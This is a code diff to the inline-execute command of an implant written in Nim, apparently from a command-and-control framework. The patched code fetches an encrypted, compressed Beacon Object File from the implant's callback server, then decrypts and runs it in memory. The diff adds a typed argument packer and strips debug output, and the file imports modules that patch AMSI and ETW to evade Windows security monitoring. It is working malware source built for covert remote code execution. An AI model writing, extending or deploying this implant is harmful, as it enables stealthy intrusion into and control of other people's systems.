@@ -9,6 +9,9 @@ import ../../selfProtections/patches/patchAMSI
 import ../../selfProtections/patches/patchETW
 import ../../util/strenc
 import ../../core/webClientListener
+import std/streams
+import std/os
+import unicode
 
 # Largely based on the excellent NiCOFF project by @frkngksl
 # Source: https://github.com/frkngksl/NiCOFF/blob/main/Main.nim
@@ -37,7 +40,7 @@ proc GetNumberOfExternalFunctions(fileBuffer:seq[byte],textSectionHeader:ptr Sec
         if(symbolTableCursor.StorageClass == IMAGE_SYM_CLASS_EXTERNAL and symbolTableCursor.SectionNumber == 0):
             returnValue+=1
         relocationTableCursor+=1
-    return returnValue * cast[uint64](sizeof(ptr uint64))
+    return returnValue
 
 proc GetExternalFunctionAddress(symbolName:string):uint64 =
     var prefixSymbol:string = obf("__imp_")
@@ -243,6 +246,71 @@ proc RunCOFF(functionName:string,fileBuffer:seq[byte],argumentBuffer:seq[byte],m
         entryPtr(unsafeaddr(argumentBuffer[0]),cast[uint32](argumentBuffer.len))
     return true
 
+# Function to package arguments with DEBUG
+proc PackArguments(args: varargs[string]): seq[byte] =
+  # We'll use a MemStream that works with bytes
+  var stream = newStringStream()
+  var currentArgIndex = 2 # Arguments start at args[2]
+  
+  while currentArgIndex < args.len:
+    let valueStr = args[currentArgIndex]
+    if currentArgIndex + 1 >= args.len:
+      return @[] # Missing type, return empty
+
+    let typeChar = args[currentArgIndex + 1]
+    
+    case typeChar:
+    of "z": # String (null-terminated)
+      stream.write(valueStr)
+      stream.write(byte(0)) # Null terminator
+    of "Z": # Wide String (UTF-16 LE, null-terminated)
+      for c in valueStr:
+        stream.write(byte(ord(c) and 0xFF))
+        stream.write(byte((ord(c) shr 8) and 0xFF))
+      stream.write(byte(0))
+      stream.write(byte(0))
+    of "i": # Integer (32-bit)
+      try:
+        let intVal = parseInt(valueStr).int32
+        stream.write(byte(intVal and 0xFF))
+        stream.write(byte((intVal shr 8) and 0xFF))
+        stream.write(byte((intVal shr 16) and 0xFF))
+        stream.write(byte((intVal shr 24) and 0xFF))
+      except ValueError:
+        return @[]
+    of "s": # Short (16-bit)
+      try:
+        let shortVal = parseInt(valueStr).int16
+        stream.write(byte(shortVal and 0xFF))
+        stream.write(byte((shortVal shr 8) and 0xFF))
+      except ValueError:
+        return @[]
+    of "b": # Binary (hex string)
+      let binData = HexStringToByteArray(valueStr, valueStr.len)
+      if binData.len == 0 and valueStr.len > 0:
+         return @[]
+      # Write length in little-endian
+      let dataLen = binData.len.uint32
+      stream.write(byte(dataLen and 0xFF)) 
+      stream.write(byte((dataLen shr 8) and 0xFF))
+      stream.write(byte((dataLen shr 16) and 0xFF))
+      stream.write(byte((dataLen shr 24) and 0xFF))
+      # Write binary data
+      for b in binData:
+        stream.write(b)
+    else:
+      return @[]
+
+    currentArgIndex += 2 # Move to the next arg/type pair
+  
+  # Manually convert the resulting string to seq[byte]
+  let stringData = stream.data
+  var byteData = newSeq[byte](stringData.len)
+  if stringData.len > 0:
+    copyMem(addr(byteData[0]), unsafeAddr(stringData[0]), stringData.len)
+  
+  return byteData
+
 # Execute a BOF from an encrypted and compressed stream or from a server file
 proc inlineExecute*(li : Listener, args : varargs[string]) : string =
     # Validate arguments
@@ -256,7 +324,6 @@ proc inlineExecute*(li : Listener, args : varargs[string]) : string =
 
     # Get the file ID/path
     let fileId: string = args[0]
-    echo obf("DEBUG InlineExecute: fileId: ") & fileId
     
     # Build URL with fileId
     var url = toLowerAscii(li.listenerType) & obf("://")
@@ -266,8 +333,6 @@ proc inlineExecute*(li : Listener, args : varargs[string]) : string =
         url = url & li.implantCallbackIp & obf(":") & li.listenerPort
     url = url & li.taskpath & obf("/") & fileId
     
-    echo obf("DEBUG InlineExecute: Requesting file from URL: ") & url
-
     # Get the file using the same approach as upload.nim
     let req = Request(
         url: parseUrl(url),
@@ -285,48 +350,96 @@ proc inlineExecute*(li : Listener, args : varargs[string]) : string =
     if res.code != 200:
         return obf("Error fetching BOF file: Server returned code ") & $res.code
     
-    # Log status code for debugging
-    echo obf("DEBUG InlineExecute: Response status: ") & $res.code
-    
     # Process file content
     try:
-        var dec = decryptData(res.body, li.UNIQUE_XOR_KEY)
-        var decStr: string = cast[string](dec)
-        fileBuffer = convertToByteSeq(uncompress(decStr))
-        
-        # Extract and log the original filename from header (if available)
-        try:
-            if "X-Original-Filename" in res.headers:
-                let encryptedFilename = base64.decode(res.headers["X-Original-Filename"])
-                let serverFilename = decryptData(encryptedFilename, li.UNIQUE_XOR_KEY)
-                echo obf("DEBUG InlineExecute: Original filename from server: ") & serverFilename
-            else:
-                echo obf("DEBUG InlineExecute: No filename provided in headers")
-        except:
-            echo obf("DEBUG InlineExecute: Error processing X-Original-Filename header")
-    except:
-        return obf("Error: Unable to decrypt and uncompress the file data from server")
+        # 1. Decrypt to string (assuming it returns string with raw bytes)
+        var decStr: string = decryptData(res.body, li.UNIQUE_XOR_KEY)
+        if decStr.len == 0:
+            return obf("Error: Decryption resulted in empty data (string)")
 
-    # Unhexlify the arguments
+        # 2. Convert to bytes
+        var decryptedBytes: seq[byte] = newSeq[byte](decStr.len)
+        if decStr.len > 0:
+            copyMem(addr(decryptedBytes[0]), unsafeAddr(decStr[0]), decStr.len)
+
+        # 3. Decompress bytes
+        var decompressedBytes: seq[byte] = uncompress(decryptedBytes)
+        if decompressedBytes.len == 0:
+            return obf("Error: Decompression resulted in empty data")
+
+        fileBuffer = decompressedBytes # Assign the decompressed bytes
+
+    except Exception as e:
+        return obf("Error processing file data: ") & getCurrentExceptionMsg()
+
+    # --- ARGUMENTS SECTION ---
     var argumentBuffer: seq[byte] = @[]
-    if(args.len == 3):
-        argumentBuffer = HexStringToByteArray(args[2], args[2].len)
-        if(argumentBuffer.len == 0):
-            result.add(obf("[!] Error parsing arguments."))
+
+    if args.len > 2:
+        # Preprocess args to remove quotes and filter empty arguments
+        var processedArgs = newSeq[string]()
+        
+        # First add the two required arguments
+        processedArgs.add(args[0])
+        processedArgs.add(args[1])
+        
+        # Then process extra arguments only if they're not empty
+        var i = 2
+        while i < args.len:
+            var arg = args[i]
+            
+            # Remove quotes from beginning and end if they exist
+            if arg.len >= 2 and arg[0] == '"' and arg[^1] == '"':
+                arg = arg[1..^2]  # Remove first and last quote
+                
+            # Only process non-empty arguments
+            if arg.len > 0:
+                # If it's an argument, we need its type
+                if i + 1 < args.len:
+                    var typeArg = args[i+1]
+                    # Clean quotes from the type too
+                    if typeArg.len >= 2 and typeArg[0] == '"' and typeArg[^1] == '"':
+                        typeArg = typeArg[1..^2]
+                    
+                    # Add the value-type pair
+                    processedArgs.add(arg)
+                    processedArgs.add(typeArg)
+                    i += 2  # Advance to the next pair
+                else:
+                    # If no type available, error
+                    result = obf("[!] Error: missing type for arguments")
+                    return
+            else:
+                # If the argument is empty, skip it
+                i += 1  # Only advance one to maintain parity
+        
+        # Verify if there are complete arg/type pairs after file_id and entry_point
+        if processedArgs.len > 2:
+            if ((processedArgs.len - 2) mod 2) != 0:
+                result = obf("[!] Error: missing type for arguments")
+                return
+            
+            # Use the processed arguments
+            argumentBuffer = PackArguments(processedArgs)
+    # --- END ARGUMENTS SECTION ---
 
     # Run COFF file
-    if(not RunCOFF(nimEntry, fileBuffer, argumentBuffer, result)):
+    var coffResult: string = ""
+    if (not RunCOFF(nimEntry, fileBuffer, argumentBuffer, coffResult)):
+        result.add(coffResult)
         result.add(obf("[!] BOF file not executed due to errors.\n"))
-        VirtualFree(allocatedMemory, 0, MEM_RELEASE)
+        if allocatedMemory != nil:
+            VirtualFree(allocatedMemory, 0, MEM_RELEASE)
         return
-        
+
     result.add(obf("[+] BOF file executed.\n"))
 
     var outData:ptr char = BeaconGetOutputData(NULL);
-
     if(outData != NULL):
         result.add(obf("[+] Output:\n"))
         result.add($outData)
 
-    VirtualFree(allocatedMemory, 0, MEM_RELEASE)
+    # Free memory if allocated
+    if allocatedMemory != nil:
+        VirtualFree(allocatedMemory, 0, MEM_RELEASE)
     return
